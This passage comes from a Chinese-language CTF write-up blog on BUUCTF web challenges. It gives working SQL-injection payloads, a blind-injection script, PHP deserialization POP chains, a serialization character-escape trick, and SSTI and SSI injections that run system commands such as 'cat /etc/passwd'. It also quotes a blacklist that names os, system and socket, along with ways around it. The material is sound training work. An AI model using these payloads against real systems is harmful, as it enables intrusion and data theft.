function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    check <span class="token operator">=</span> param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看代码关键点就是<code>Task</code>类中的函数执行，分析得出只要<code>action</code>中同时含有scan和read即可读取出文件并返回，而在<code>De1ta</code>路径中有创建<code>Task</code>类的过程，<code>geneSign</code>路径中可以获取sign值，所以让<code>action=scanread&amp;parma=flag.txt</code>，通过<code>geneSign</code>路径获取sign即可，<code>getSign</code>函数中md5内容的拼接，是<code>secert_key + param + action</code>，而对于<code>geneSign</code>路径来说，action永远为scan，所以geneSign结果就是<code>secert_key + param + &#39;scan&#39;</code>拼接出带有同时带有scan和read只要让<code>param=flag.txtread</code>即可，传入<code>geneSign</code>拿到sign值</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-29" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-29</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 15.50.50.png)</p><p>最终payload如下</p><pre class="line-numbers language-none"><code class="language-none">payload:De1ta?param&#x3D;flag.txtCookie: action&#x3D;readscan;sign&#x3D;1983e9273c0ae452b67ccecb2fb88ed2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>        <h2 id="网鼎杯-2020-朱雀组-Nmap"   >          <a href="#网鼎杯-2020-朱雀组-Nmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2>      <p>详见该题：[BUUCTF 2018]Online Tool</p>        <h2 id="SWPU2019-Web1"   >          <a href="#SWPU2019-Web1" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2>      <p>是SQL注入</p><p>1、空格过滤</p><p>2、注释符过滤</p><p>3、<span class="exturl"><a class="exturl__link"   href="https://www.anquanke.com/post/id/193512" >information_schema绕过</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>4、无列名注入</p><p>第一个用/**/绕过就行</p><p>第二个末尾加单引号闭合就行</p><p>最后一个使用innodb引擎绕过</p><p>条件是MySQL版本&gt;5.5</p><p>表名在innodb_table_stats</p><p>列名在innodb_table_index</p><p>select table_name from mysql.innodb_table_stats where database_name=database()</p><p>首先是测试列数，为22列，回显在2，3位，然后爆表名</p><pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from(mysql.innodb_table_stats)where(database_name&#x3D;database())),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表名：ads，users</p><p>无列名注入</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">select 1,2,3 union select * from admin;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样的话union select的内容就是前三列的内容</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">select `3` from (select 1,2,3 union select * from admin)a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-none"><code class="language-none">select b from (select 1,2,3 as b union select * from admin)a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就是第三列的内容</p><pre class="line-numbers language-none"><code class="language-none">payload:-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="MRCTF2020-Ezpop"   >          <a href="#MRCTF2020-Ezpop" class="heading-link"><i class="fas fa-link"></i></a><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2>      <pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">Welcome to index.php&lt;?php&#x2F;&#x2F;flag is in flag.php&#x2F;&#x2F;WTF IS THIS?&#x2F;&#x2F;Learn From https:&#x2F;&#x2F;ctf.ieki.xyz&#x2F;library&#x2F;php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95&#x2F;&#x2F;And Crack It!class Modifier &#123;    protected $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file&#x3D;&#39;index.php&#39;)&#123;        $this-&gt;source &#x3D; $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\.\.&#x2F;i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source &#x3D; &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p &#x3D; array();    &#125;    public function __get($key)&#123;        $function &#x3D; $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a&#x3D;new Show;    highlight_file(__FILE__);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化不用多说，最后应该文件包含加PHP伪协议读取，找链子</p><p><code>__invoke</code>需要以函数调用类，在Test的<code>__get</code>方法中，<code>__get</code>方法在Show中<code>__toString</code>调用类中不存在的方法时会被调用，最终构造出的就是</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpclass Modifier&#123;    protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source &#x3D; $file;    &#125;    public function __toString()&#123;        return &quot;output anything you want&quot;;    &#125;&#125;class Test&#123;    public $p;&#125;$payload &#x3D; new Show(&#39;test&#39;);$payload-&gt;str &#x3D; new Test();$payload-&gt;str-&gt;p &#x3D; new Modifier();$hack &#x3D; new Show($payload);echo urlencode(serialize($hack));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内容base64解码即可</p>        <h2 id="NPUCTF2020-ReadlezPHP"   >          <a href="#NPUCTF2020-ReadlezPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2>      <p>查看源代码，发现了时间显示所使用的./time.php?source</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;        $this-&gt;b &#x3D; &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a &#x3D; $this-&gt;a;        $b &#x3D; $this-&gt;b;        echo $b($a);    &#125;&#125;$c &#x3D; new HelloPhp;if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化构造出以b为函数名，以a为参数的函数执行即可，尝试system发现没有回显，可能是被过滤，再尝试eval，也被过滤，放弃执行系统命令，尝试执行php函数，使用assert包裹phpinfo()，查找flag成功</p>        <h2 id="CISCN2019-华东南赛区-Web11"   >          <a href="#CISCN2019-华东南赛区-Web11" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2>      <p>在XFF位置尝试SSTI成功，输入报错发现使用的是smarty渲染，{system(‘ls /‘)}发现flag，{system(‘cp /flag /var/www/html/flag.txt’)}将文件带出即可</p>        <h2 id="极客大挑战-2019-FinalSQL"   >          <a href="#极客大挑战-2019-FinalSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2>      <p>点提示发现注入点，过滤了空格，还是数字型注入，使用布尔盲注</p><pre class="line-numbers language-none"><code class="language-none">爆库名：id&#x3D;2^(ascii(substr((select(database())),&#123;i&#125;,1))&#x3D;&#123;ord(j)&#125;)正确返回3，错误返回2爆表名id&#x3D;2^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;geek&#39;)),&#123;i&#125;,1))&#x3D;&#123;ord(j)&#125;)爆列名id&#x3D;2^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),&#123;i&#125;,1))&#x3D;&#123;ord(j)&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终payload脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://93af0548-22e2-4a84-8fd6-3a78dfdda8f3.node4.buuoj.cn:81/search.php"</span>name<span class="token operator">=</span><span class="token string">",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"</span>flag<span class="token operator">=</span><span class="token string">"flag&#123;1234567890-bcde&#125;,"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        parma<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"2^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>parma<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Ohhh You find the flag read on!"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="0CTF-2016-piapiapia"   >          <a href="#0CTF-2016-piapiapia" class="heading-link"><i class="fas fa-link"></i></a><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2>      <p>没啥内容先扫目录，<span class="exturl"><a class="exturl__link"   href="http://www.zip扫出源码,发现有隐藏的注册页面,先进行注册和登录,然后再查看源码/" >www.zip扫出源码，发现有隐藏的注册页面，先进行注册和登录，然后再查看源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">index.php和register.php一个登录一个注册class.php关键函数public function filter($string) &#123;$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;return preg_replace($safe, &#39;hacker&#39;, $string);&#125;update.php更新个人信息内容if($_POST[&#39;phone&#39;] &amp;&amp; $_POST[&#39;email&#39;] &amp;&amp; $_POST[&#39;nickname&#39;] &amp;&amp; $_FILES[&#39;photo&#39;]) &#123;$username &#x3D; $_SESSION[&#39;username&#39;];if(!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))die(&#39;Invalid phone&#39;);if(!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))die(&#39;Invalid email&#39;);if(preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)die(&#39;Invalid nickname&#39;);$file &#x3D; $_FILES[&#39;photo&#39;];if($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)die(&#39;Photo size error&#39;);move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]));$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39; . md5($file[&#39;name&#39;]);$user-&gt;update_profile($username, serialize($profile));echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;&#125;profile.php$profile &#x3D; unserialize($profile);$phone &#x3D; $profile[&#39;phone&#39;];$email &#x3D; $profile[&#39;email&#39;];$nickname &#x3D; $profile[&#39;nickname&#39;];$photo &#x3D; base64_encode(file_get_contents($profile[&#39;photo&#39;]));&#x2F;&#x2F;关键，如果其中photo文件名是config.php即可读取到flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化字符逃逸漏洞：</p><pre class="line-numbers language-none"><code class="language-none">原始序列化字符串：a:1:&#123;s:5:&quot;phone&quot;;s:5:&quot;where&quot;;&#125;此时读取到的内容是phone&#x3D;where将字符串进行过滤，preg_replace(&#39;where&#39;, &#39;hacker&#39;, $string);序列化后字符串变为a:1:&#123;s:5:&quot;phone&quot;;s:5:&quot;hacker&quot;;&#125;此时反序列化只读取前5位，hacke，后面的r就属于逃逸的字符了，那么如果我们构造出一个能逃逸足够长的字符的字符串，就可以让序列化后的字符串存入我们需要的内容，在本题中我们想要传入的是s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;，而又因为我们需要对nickname的内容进行绕过，此时nickname是一个数组所以我们最终需要逃逸的字符串就是&quot;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;，所以最后构造payload使用关键字where，替换为hacker后能溢出，上面字符串有34个字符那么我们传入34个where+字符串即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">nickname[]&#x3D;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="BJDCTF2020-EasySearch"   >          <a href="#BJDCTF2020-EasySearch" class="heading-link"><i class="fas fa-link"></i></a><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2>      <p>扫描，得到index.php.swp</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpob_start();function get_hash()&#123;$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times$content &#x3D; uniqid().$random;return sha1($content); &#125;    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);***    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )    &#123;        $admin &#x3D; &#39;6d0bc1&#39;;        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text &#x3D; &#39;            ***            ***            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;            ******&#39;;            fwrite($shtml,$text);            fclose($shtml);            ***echo &quot;[!] Header  error ...&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;                &#125;else    &#123;***    &#125;***?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求password经过md5处理后前六位是6d0bc1</p><p>贴一个爆破的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抓包发现响应头中</p><pre class="line-numbers language-none"><code class="language-none">Url_is_here: public&#x2F;11b26335b1b3d0a88c6ec7333d2f5f522d1237f2.shtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问尝试XFF SSTI失败，看看wp吧，是SSI注入漏洞</p><pre class="line-numbers language-none"><code class="language-none">SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。</p><p><strong>①显示服务器端环境变量&lt;#echo&gt;</strong></p><p>本文档名称：</p><p><code>&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;</code></p><p>现在时间：</p><p><code>&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;</code></p><p>显示IP地址：</p><p><code>&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt;</code></p><p><strong>②将文本内容直接插入到文档中&lt;#include&gt;</strong></p><p><code>&lt;! #include file=&quot;文件名称&quot;–&gt;</code></p><p><code>&lt;!--#include virtual=&quot;index.html&quot; --&gt;</code></p><p><code>&lt;! #include virtual=&quot;文件名称&quot;–&gt;</code></p><p><code>&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</code></p><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p><p><strong>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</strong></p><p>文件最近更新日期：</p><p><code>&lt;! #flastmod file=&quot;文件名称&quot;–&gt;</code></p><p>文件的长度：</p><p><code>&lt;!–#fsize file=&quot;文件名称&quot;–&gt;</code></p><p><strong>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</strong></p><p><code>&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;</code></p><p><code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></p><p><code>&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;</code></p><p><code>&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;</code></p><p>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。</p><p><strong>⑤设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式</strong>)</p><p><strong>⑥高级SSI可设置变量使用if条件语句。</strong></p><p>所以我们传入<code>&lt;!–#exec cmd=&quot;系统命令&quot;–&gt;</code>即可执行系统命令，password内容已确定，只能通过username传入</p><pre class="line-numbers language-none"><code class="language-none">payload:POSTusername&#x3D;&lt;!--#exec cmd&#x3D;&quot;cat ..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password&#x3D;2020666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h2 id="GYCTF2020-FlaskApp"   >          <a href="#GYCTF2020-FlaskApp" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2>      <p>解密处SSTI</p><p>过滤了*，system，os</p><p>试试读取文件源码，找到了黑名单</p><p><code>black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;]</code></p><p>使用加号绕过，遍历根目录</p><p><code>&#123;&#123;url_for.__globals__["o"+"s"].listdir('/')&#125;&#125;</code></p><p>发现<code>this_is_the_flag.txt</code>文件</p><p><code>&#123;&#123;url_for.__globals__['__builtins__'].open('/this_is_the_f' + 'lag.txt','r').read()&#125;&#125;</code></p><p>拿到flag</p>        <h2 id="BSidesCF-2019-Kookie"   >          <a href="#BSidesCF-2019-Kookie" class="heading-link"><i class="fas fa-link"></i></a><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2>      <pre class="line-numbers language-none"><code class="language-none">Cookie: username&#x3D;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="极客大挑战-2019-RCE-ME"   >          <a href="#极客大挑战-2019-RCE-ME" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2>      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token 